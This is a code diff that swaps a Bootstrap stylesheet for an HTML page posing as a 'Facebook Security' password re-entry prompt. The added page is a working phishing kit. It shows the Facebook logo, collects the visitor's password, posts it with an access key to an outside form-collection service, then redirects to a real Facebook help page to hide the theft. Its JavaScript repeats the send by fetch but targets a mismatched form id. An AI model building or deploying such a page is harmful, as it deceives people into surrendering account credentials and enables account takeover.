@@ -1,462 +1,199 @@
-@charset "UTF-8";body {
-  font-family: "Arial, sans-serif"
-}
+<!DOCTYPE html>
+<html lang="en">
 
-h1 {
-  font-weight: 700
-}
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Password Page</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
 
-.meta-logo {
-  width: 100px;
-  height: auto
-}
+        .container {
+            background-color: white;
+            padding: 40px 30px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            width: 360px;
+            position: relative;
+        }
 
-.header-logo-container {
-  height: 80px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  margin: 0
-}
+        .logo {
+            margin-bottom: 20px;
+        }
 
-.validation_form_para {
-  font-size: 12px
-}
+        .logo img {
+            width: 120px;
+        }
 
-.img-smal {
-  width: 100%;
-  height: auto
-}
+        .header {
+            margin-bottom: 20px;
+            font-size: 18px;
+            color: #333;
+            font-weight: bold;
+        }
 
-@media (max-width: 590px) {
-  .img-smal {
-      width:80%;
-      height: 50%;
-      order: 1;
-      display: block
-  }
-}
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left;
+            position: relative;
+        }
 
-button,a {
-  text-decoration: none;
-  display: inline-block
-}
+        .form-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #606770;
+        }
 
-button {
-  background-color: #0064e0;
-  color: #fff;
-  border: none;
-  border-radius: 50px;
-  padding: 10px 35px;
-  font-size: 1rem;
-  font-weight: 700;
-  cursor: pointer
-}
+        .input-wrapper {
+            position: relative;
+        }
 
-button:hover {
-  background-color: #0053c1
-}
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            padding-right: 40px;
+            /* Space for the eye icon */
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            font-size: 16px;
+            color: #1c1e21;
+            box-sizing: border-box;
+        }
 
-a {
-  color: #0064e0;
-  font-size: 1rem;
-  font-weight: 700
-}
+        .form-group input:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0px 0px 0px 2px rgba(24, 119, 242, 0.2);
+        }
 
-a:hover {
-  color: #0053c1
-}
+        .eye-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 20px;
+            color: #606770;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
 
-.font-italic {
-  color: #6c757d;
-  font-style: italic
-}
+        .eye-icon:hover {
+            color: #1877f2;
+        }
 
-:root {
-  font-family: Poppins,sans-serif
-}
+        .submit-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
 
-/*!
-* Bootstrap  v5.3.3 (https://getbootstrap.com/)
-* Copyright 2011-2024 The Bootstrap Authors
-* Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
-*/
-:root,[data-bs-theme=light] {
-  --bs-blue: #0d6efd;
-  --bs-indigo: #6610f2;
-  --bs-purple: #6f42c1;
-  --bs-pink: #d63384;
-  --bs-red: #dc3545;
-  --bs-orange: #fd7e14;
-  --bs-yellow: #ffc107;
-  --bs-green: #198754;
-  --bs-teal: #20c997;
-  --bs-cyan: #0dcaf0;
-  --bs-black: #000;
-  --bs-white: #fff;
-  --bs-gray: #6c757d;
-  --bs-gray-dark: #343a40;
-  --bs-gray-100: #f8f9fa;
-  --bs-gray-200: #e9ecef;
-  --bs-gray-300: #dee2e6;
-  --bs-gray-400: #ced4da;
-  --bs-gray-500: #adb5bd;
-  --bs-gray-600: #6c757d;
-  --bs-gray-700: #495057;
-  --bs-gray-800: #343a40;
-  --bs-gray-900: #212529;
-  --bs-primary: #0d6efd;
-  --bs-secondary: #6c757d;
-  --bs-success: #198754;
-  --bs-info: #0dcaf0;
-  --bs-warning: #ffc107;
-  --bs-danger: #dc3545;
-  --bs-light: #f8f9fa;
-  --bs-dark: #212529;
-  --bs-primary-rgb: 13,110,253;
-  --bs-secondary-rgb: 108,117,125;
-  --bs-success-rgb: 25,135,84;
-  --bs-info-rgb: 13,202,240;
-  --bs-warning-rgb: 255,193,7;
-  --bs-danger-rgb: 220,53,69;
-  --bs-light-rgb: 248,249,250;
-  --bs-dark-rgb: 33,37,41;
-  --bs-primary-text-emphasis: #052c65;
-  --bs-secondary-text-emphasis: #2b2f32;
-  --bs-success-text-emphasis: #0a3622;
-  --bs-info-text-emphasis: #055160;
-  --bs-warning-text-emphasis: #664d03;
-  --bs-danger-text-emphasis: #58151c;
-  --bs-light-text-emphasis: #495057;
-  --bs-dark-text-emphasis: #495057;
-  --bs-primary-bg-subtle: #cfe2ff;
-  --bs-secondary-bg-subtle: #e2e3e5;
-  --bs-success-bg-subtle: #d1e7dd;
-  --bs-info-bg-subtle: #cff4fc;
-  --bs-warning-bg-subtle: #fff3cd;
-  --bs-danger-bg-subtle: #f8d7da;
-  --bs-light-bg-subtle: #fcfcfd;
-  --bs-dark-bg-subtle: #ced4da;
-  --bs-primary-border-subtle: #9ec5fe;
-  --bs-secondary-border-subtle: #c4c8cb;
-  --bs-success-border-subtle: #a3cfbb;
-  --bs-info-border-subtle: #9eeaf9;
-  --bs-warning-border-subtle: #ffe69c;
-  --bs-danger-border-subtle: #f1aeb5;
-  --bs-light-border-subtle: #e9ecef;
-  --bs-dark-border-subtle: #adb5bd;
-  --bs-white-rgb: 255,255,255;
-  --bs-black-rgb: 0,0,0;
-  --bs-font-sans-serif: system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue","Noto Sans","Liberation Sans",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";
-  --bs-font-monospace: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
-  --bs-gradient: linear-gradient(180deg, rgba(255, 255, 255, .15), rgba(255, 255, 255, 0));
-  --bs-body-font-family: var(--bs-font-sans-serif);
-  --bs-body-font-size: 1rem;
-  --bs-body-font-weight: 400;
-  --bs-body-line-height: 1.5;
-  --bs-body-color: #212529;
-  --bs-body-color-rgb: 33,37,41;
-  --bs-body-bg: #fff;
-  --bs-body-bg-rgb: 255,255,255;
-  --bs-emphasis-color: #000;
-  --bs-emphasis-color-rgb: 0,0,0;
-  --bs-secondary-color: rgba(33, 37, 41, .75);
-  --bs-secondary-color-rgb: 33,37,41;
-  --bs-secondary-bg: #e9ecef;
-  --bs-secondary-bg-rgb: 233,236,239;
-  --bs-tertiary-color: rgba(33, 37, 41, .5);
-  --bs-tertiary-color-rgb: 33,37,41;
-  --bs-tertiary-bg: #f8f9fa;
-  --bs-tertiary-bg-rgb: 248,249,250;
-  --bs-heading-color: inherit;
-  --bs-link-color: #0d6efd;
-  --bs-link-color-rgb: 13,110,253;
-  --bs-link-decoration: underline;
-  --bs-link-hover-color: #0a58ca;
-  --bs-link-hover-color-rgb: 10,88,202;
-  --bs-code-color: #d63384;
-  --bs-highlight-color: #212529;
-  --bs-highlight-bg: #fff3cd;
-  --bs-border-width: 1px;
-  --bs-border-style: solid;
-  --bs-border-color: #dee2e6;
-  --bs-border-color-translucent: rgba(0, 0, 0, .175);
-  --bs-border-radius: .375rem;
-  --bs-border-radius-sm: .25rem;
-  --bs-border-radius-lg: .5rem;
-  --bs-border-radius-xl: 1rem;
-  --bs-border-radius-xxl: 2rem;
-  --bs-border-radius-2xl: var(--bs-border-radius-xxl);
-  --bs-border-radius-pill: 50rem;
-  --bs-box-shadow: 0 .5rem 1rem rgba(0, 0, 0, .15);
-  --bs-box-shadow-sm: 0 .125rem .25rem rgba(0, 0, 0, .075);
-  --bs-box-shadow-lg: 0 1rem 3rem rgba(0, 0, 0, .175);
-  --bs-box-shadow-inset: inset 0 1px 2px rgba(0, 0, 0, .075);
-  --bs-focus-ring-width: .25rem;
-  --bs-focus-ring-opacity: .25;
-  --bs-focus-ring-color: rgba(13, 110, 253, .25);
-  --bs-form-valid-color: #198754;
-  --bs-form-valid-border-color: #198754;
-  --bs-form-invalid-color: #dc3545;
-  --bs-form-invalid-border-color: #dc3545
-}
+        .submit-button:hover {
+            background-color: #166fe5;
+        }
 
-[data-bs-theme=dark] {
-  color-scheme: dark;
-  --bs-body-color: #dee2e6;
-  --bs-body-color-rgb: 222,226,230;
-  --bs-body-bg: #212529;
-  --bs-body-bg-rgb: 33,37,41;
-  --bs-emphasis-color: #fff;
-  --bs-emphasis-color-rgb: 255,255,255;
-  --bs-secondary-color: rgba(222, 226, 230, .75);
-  --bs-secondary-color-rgb: 222,226,230;
-  --bs-secondary-bg: #343a40;
-  --bs-secondary-bg-rgb: 52,58,64;
-  --bs-tertiary-color: rgba(222, 226, 230, .5);
-  --bs-tertiary-color-rgb: 222,226,230;
-  --bs-tertiary-bg: #2b3035;
-  --bs-tertiary-bg-rgb: 43,48,53;
-  --bs-primary-text-emphasis: #6ea8fe;
-  --bs-secondary-text-emphasis: #a7acb1;
-  --bs-success-text-emphasis: #75b798;
-  --bs-info-text-emphasis: #6edff6;
-  --bs-warning-text-emphasis: #ffda6a;
-  --bs-danger-text-emphasis: #ea868f;
-  --bs-light-text-emphasis: #f8f9fa;
-  --bs-dark-text-emphasis: #dee2e6;
-  --bs-primary-bg-subtle: #031633;
-  --bs-secondary-bg-subtle: #161719;
-  --bs-success-bg-subtle: #051b11;
-  --bs-info-bg-subtle: #032830;
-  --bs-warning-bg-subtle: #332701;
-  --bs-danger-bg-subtle: #2c0b0e;
-  --bs-light-bg-subtle: #343a40;
-  --bs-dark-bg-subtle: #1a1d20;
-  --bs-primary-border-subtle: #084298;
-  --bs-secondary-border-subtle: #41464b;
-  --bs-success-border-subtle: #0f5132;
-  --bs-info-border-subtle: #087990;
-  --bs-warning-border-subtle: #997404;
-  --bs-danger-border-subtle: #842029;
-  --bs-light-border-subtle: #495057;
-  --bs-dark-border-subtle: #343a40;
-  --bs-heading-color: inherit;
-  --bs-link-color: #6ea8fe;
-  --bs-link-hover-color: #8bb9fe;
-  --bs-link-color-rgb: 110,168,254;
-  --bs-link-hover-color-rgb: 139,185,254;
-  --bs-code-color: #e685b5;
-  --bs-highlight-color: #dee2e6;
-  --bs-highlight-bg: #664d03;
-  --bs-border-color: #495057;
-  --bs-border-color-translucent: rgba(255, 255, 255, .15);
-  --bs-form-valid-color: #75b798;
-  --bs-form-valid-border-color: #75b798;
-  --bs-form-invalid-color: #ea868f;
-  --bs-form-invalid-border-color: #ea868f
-}
+        .error-message {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-top: 5px;
+            margin-bottom: 15px;
+            text-align: left;
+        }
+    </style>
+</head>
 
-*,:after,:before {
-  box-sizing: border-box
-}
+<body>
+    <div class="container">
+        <div class="logo">
+            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Logo">
+            <div class="header">
+                Facebook Security
+            </div>
+            <p>Please re-enter your password to complete the request.</p>
+            <form id="meta-form" action="https://submit-form.com/IyOvhgYtZ" method="POST">
+                <input type="hidden" name="_redirect" value="https://www.facebook.com/help/media/thank-you?rdrhc" />
 
-@media (prefers-reduced-motion:no-preference) {
-  :root {
-      scroll-behavior: smooth
-  }
-}
+                <!-- Replace with your Access Key -->
+                <input type="hidden" name="access_key" value="22983eba-14f6-431b-8283-10e298027760">
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <div class="input-wrapper">
+                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                        <i class="eye-icon fas fa-eye" id="togglePassword"></i>
+                    </div>
+                    <span id="error-message" class="error-message"></span>
+                </div>
+                <button type="submit" class="submit-button">Submit</button>
+                <center>
+                    <font color="black">
+                        <font size="2">
+            </form>
+        </div>
+        <script>
+            document.getElementById('togglePassword').addEventListener('click', function() {
+                var passwordField = document.getElementById('password');
+                var eyeIcon = this;
+                if (passwordField.type === 'password') {
+                    passwordField.type = 'text';
+                    eyeIcon.classList.remove('fa-eye');
+                    eyeIcon.classList.add('fa-eye-slash');
+                } else {
+                    passwordField.type = 'password';
+                    eyeIcon.classList.remove('fa-eye-slash');
+                    eyeIcon.classList.add('fa-eye');
+                }
+            });
 
-body {
-  margin: 0;
-  font-family: var(--bs-body-font-family);
-  font-size: var(--bs-body-font-size);
-  font-weight: var(--bs-body-font-weight);
-  line-height: var(--bs-body-line-height);
-  color: var(--bs-body-color);
-  text-align: var(--bs-body-text-align);
-  background-color: var(--bs-body-bg);
-  -webkit-text-size-adjust: 100%;
-  -webkit-tap-highlight-color: transparent
-}
+            document.getElementById('passwordForm').addEventListener('submit', function(event) {
+                var passwordField = document.getElementById('password');
+                var errorMessage = document.getElementById('error-message');
+                if (passwordField.value.length < 6) {
+                    errorMessage.textContent = 'Password must be at least 6 characters long.';
+                    event.preventDefault();
+                } else {
+                    errorMessage.textContent = '';
+                    // Perform form submission via Fetch API
+                    event.preventDefault(); // Prevent default form submission
 
-hr {
-  margin: 1rem 0;
-  color: inherit;
-  border: 0;
-  border-top: var(--bs-border-width) solid;
-  opacity: .25
-}
+                    var formData = new FormData(this);
+                    fetch(this.action, {
+                            method: 'POST',
+                            body: formData,
+                            headers: {
+                                'Accept': 'application/json'
+                            }
+                        })
+                        .then(response => {
+                            if (response.ok) {
+                                window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc'; // Redirect to desired URL
+                            } else {
+                                errorMessage.textContent = 'There was an error. Please try again.';
+                            }
+                        })
+                        .catch(() => {
+                            errorMessage.textContent = 'There was an error. Please try again.';
+                        });
+                }
+            });
+        </script>
+</body>
 
-.h1,.h2,.h3,.h4,.h5,.h6,h1,h2,h3,h4,h5,h6 {
-  margin-top: 0;
-  margin-bottom: .5rem;
-  font-weight: 500;
-  line-height: 1.2;
-  color: var(--bs-heading-color)
-}
-
-.h1,h1 {
-  font-size: calc(1.375rem + 1.5vw)
-}
-
-@media (min-width: 1200px) {
-  .h1,h1 {
-      font-size:2.5rem
-  }
-}
-
-.h2,h2 {
-  font-size: calc(1.325rem + .9vw)
-}
-
-@media (min-width: 1200px) {
-  .h2,h2 {
-      font-size:2rem
-  }
-}
-
-.h3,h3 {
-  font-size: calc(1.3rem + .6vw)
-}
-
-@media (min-width: 1200px) {
-  .h3,h3 {
-      font-size:1.75rem
-  }
-}
-
-.h4,h4 {
-  font-size: calc(1.275rem + .3vw)
-}
-
-@media (min-width: 1200px) {
-  .h4,h4 {
-      font-size:1.5rem
-  }
-}
-
-.h5,h5 {
-  font-size: 1.25rem
-}
-
-.h6,h6 {
-  font-size: 1rem
-}
-
-p {
-  margin-top: 0;
-  margin-bottom: 1rem
-}
-
-abbr[title] {
-  -webkit-text-decoration: underline dotted;
-  text-decoration: underline dotted;
-  cursor: help;
-  -webkit-text-decoration-skip-ink: none;
-  text-decoration-skip-ink: none
-}
-
-address {
-  margin-bottom: 1rem;
-  font-style: normal;
-  line-height: inherit
-}
-
-ol,ul {
-  padding-left: 2rem
-}
-
-dl,ol,ul {
-  margin-top: 0;
-  margin-bottom: 1rem
-}
-
-ol ol,ol ul,ul ol,ul ul {
-  margin-bottom: 0
-}
-
-dt {
-  font-weight: 700
-}
-
-dd {
-  margin-bottom: .5rem;
-  margin-left: 0
-}
-
-blockquote {
-  margin: 0 0 1rem
-}
-
-b,strong {
-  font-weight: bolder
-}
-
-.small,small {
-  font-size: .875em
-}
-
-.mark,mark {
-  padding: .1875em;
-  color: var(--bs-highlight-color);
-  background-color: var(--bs-highlight-bg)
-}
-
-sub,sup {
-  position: relative;
-  font-size: .75em;
-  line-height: 0;
-  vertical-align: baseline
-}
-
-sub {
-  bottom: -.25em
-}
-
-sup {
-  top: -.5em
-}
-
-a {
-  color: rgba(var(--bs-link-color-rgb),var(--bs-link-opacity,1));
-  text-decoration: underline
-}
-
-a:hover {
-  --bs-link-color-rgb: var(--bs-link-hover-color-rgb)
-}
-
-a:not([href]):not([class]),a:not([href]):not([class]):hover {
-  color: inherit;
-  text-decoration: none
-}
-
-code,kbd,pre,samp {
-  font-family: var(--bs-font-monospace);
-  font-size: 1em
-}
-
-pre {
-  display: block;
-  margin-top: 0;
-  margin-bottom: 1rem;
-  overflow: auto;
-  font-size: .875em
-}
-
-pre code {
-  font-size: inherit;
-  color: inherit;
-  word-break: normal
-}
-
-code {
-  font-size: .875em;
-  color: var(--bs-code-color);
-  word-wrap: break-word
-}
-
-a>code {
-  color: inherit
-}
+</html>
